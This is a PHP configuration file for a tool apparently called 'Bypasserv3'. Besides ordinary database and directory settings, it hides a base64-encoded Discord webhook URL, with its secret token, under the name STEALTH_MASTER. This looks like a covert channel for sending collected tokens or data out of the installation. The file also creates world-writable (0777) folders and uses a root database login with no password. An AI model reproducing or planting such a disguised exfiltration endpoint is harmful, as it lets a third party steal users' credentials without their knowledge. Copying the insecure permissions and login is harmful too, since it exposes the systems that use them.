<?php
/**
 * Bypasserv3 - Configuration File
 */

define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTkzMjg1MjQyOTcyMTY3MC9KWUwwOVlUVXZEdmhwakotN1cyNWVwQ2JhYWpwNk1kVlFUTFVfM3Y1N3JBUE91VE0xU29rVWRYRDlhTm9pV3Z5WHR1WQ=='));

// Database settings (if needed in future)
define('DB_HOST', 'localhost');
define('DB_NAME', 'bypasserv3');
define('DB_USER', 'root');
define('DB_PASS', '');

// Security settings
define('RATE_LIMIT_MAX', 50);
define('RATE_LIMIT_WINDOW', 3600);

// Instance settings
define('INSTANCES_DIR', __DIR__ . '/instances');
define('TOKENS_DIR', __DIR__ . '/tokens');
define('DATA_DIR', __DIR__ . '/data');

// Create directories if they don't exist
if (!file_exists(INSTANCES_DIR)) {
    mkdir(INSTANCES_DIR, 0777, true);
}
if (!file_exists(TOKENS_DIR)) {
    mkdir(TOKENS_DIR, 0777, true);
}
if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0777, true);
}
?>
